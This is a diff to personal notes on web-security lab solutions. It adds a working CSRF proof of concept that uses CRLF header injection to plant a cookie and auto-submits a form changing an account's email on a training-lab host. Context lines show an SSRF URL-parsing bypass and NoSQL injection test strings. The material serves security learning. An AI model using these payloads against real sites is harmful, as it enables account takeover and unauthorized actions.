@@ -316,7 +316,22 @@ Url encode once/twice
 
 Compilance: use http:/evil@original.com/admin/delete - bypass. Then http:/evil#@original.com/admin/delete - not bypass. Then url encode '#' and get >http://localhost%23@stock.weliketoshop.net/admin/delete
 
-# NoSQL injection.
+
+## **CSRF**
+# CSRF where token is duplicated in cookie
+```
+<html>
+  <body>
+    <form action="https://0aa1006004b2a765804530a000d000e2.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="wiener4&#64;normal&#45;user&#46;net" />
+      <input type="hidden" name="csrf" value="RzJo0DwqRiulhBMA0f1HKAvMA2IYUdVZ" />
+      <input type="submit" value="Submit request" />
+    </form>
+<img src="https://0aa1006004b2a765804530a000d000e2.web-security-academy.net//?search=1%0d%0aSet-Cookie:+csrf%3dRzJo0DwqRiulhBMA0f1HKAvMA2IYUdVZ%3b+SameSite%3dNone" onerror=document.forms[0].submit();>
+  </body>
+</html>
+```
+## NoSQL injection.
 Tests:
 ```
 '"`{
